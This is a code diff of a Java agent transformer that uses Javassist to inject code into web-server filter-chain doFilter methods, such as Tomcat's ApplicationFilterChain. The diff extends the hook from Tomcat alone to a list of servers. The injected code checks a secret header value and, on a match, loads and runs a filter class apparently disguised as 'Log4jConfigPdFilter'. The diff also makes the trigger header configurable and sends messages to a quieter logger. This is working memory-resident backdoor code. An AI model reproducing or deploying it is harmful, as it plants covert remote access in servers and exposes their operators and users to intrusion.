@@ -10,9 +10,11 @@ public class MyTransformer implements ClassFileTransformer {
                             Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                             byte[] classFileBuffer) {
 
-        if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
+        if (!AgentMainTest.WEB_SERVER_LIST.contains(className.replace('/', '.'))) {
             return null;
         }
+
+        AgentMainTest.logger.info("exist web server");
 
         try {
             ClassPool pool = new ClassPool(true);
@@ -25,40 +27,40 @@ public class MyTransformer implements ClassFileTransformer {
 
             doFilter.insertBefore(
                     "{ " +
-                        "    System.out.println(\"[Agent] into doFilter\");" +
-                        "    Object reqObj = $1;" +
-                        "    Object resObj = $2;" +
-                        "    try {" +
-                        "            java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
-                        "            String ua = (String)getHeader.invoke(reqObj, new Object[]{ \"User-Agent\" });" +
-                        "            if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
-                        "                try {" +
-                        "                    ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
-                        "                    if (cl == null) cl = this.getClass().getClassLoader();" +
-                        "                    System.out.println(\"[Agent] ApplicationFilterChain#cl = \" + cl);" +
-                        "                    Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
-                        "                    java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
-                        "                    Object obj = m.invoke(null, new Object[]{ cl });" +
-                        "                    java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
-                        "                    exec.invoke(obj, new Object[]{ reqObj, resObj });" +
-                        "                } catch (Throwable t) {" +
-                        "                    System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
-                        "                    t.printStackTrace();" +
-                        "                }" +
-                        "                return;" +
-                        "        }" +
-                        "    } catch (Throwable e) { e.printStackTrace(); }" +
-                        "}"
+                            "    System.out.println(\"[Agent] into doFilter\");" +
+                            "    Object reqObj = $1;" +
+                            "    Object resObj = $2;" +
+                            "    try {" +
+                            "            java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
+                            "            String ua = (String)getHeader.invoke(reqObj, new Object[]{ \""+AgentMainTest.HEADER_PARAM+"\" });" +
+                            "            if (ua != null && \""+AgentMainTest.HEADER_PARAM_VALUE+"\".toLowerCase().contains(ua.toLowerCase())) {" +
+                            "                try {" +
+                            "                    ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
+                            "                    if (cl == null) cl = this.getClass().getClassLoader();" +
+                            "                    System.out.println(\"[Agent] ApplicationFilterChain#cl = \" + cl);" +
+                            "                    Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
+                            "                    java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
+                            "                    Object obj = m.invoke(null, new Object[]{ cl });" +
+                            "                    java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
+                            "                    exec.invoke(obj, new Object[]{ reqObj, resObj });" +
+                            "                } catch (Throwable t) {" +
+                            "                    System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
+                            "                    t.printStackTrace();" +
+                            "                }" +
+                            "                return;" +
+                            "        }" +
+                            "    } catch (Throwable e) { e.printStackTrace(); }" +
+                            "}"
             );
 
 
-            System.out.println("[+] Hooked doFilter successfully (Tomcat10+/JDK17/Loader-isolation fixed).");
+            AgentMainTest.logger.info("[+] Hooked doFilter successfully.");
             byte[] bytecode = cc.toBytecode();
             cc.detach();
             return bytecode;
 
         } catch (Throwable e) {
-            e.printStackTrace();
+            AgentMainTest.logger.info(e.getMessage());
             return null;
         }
 
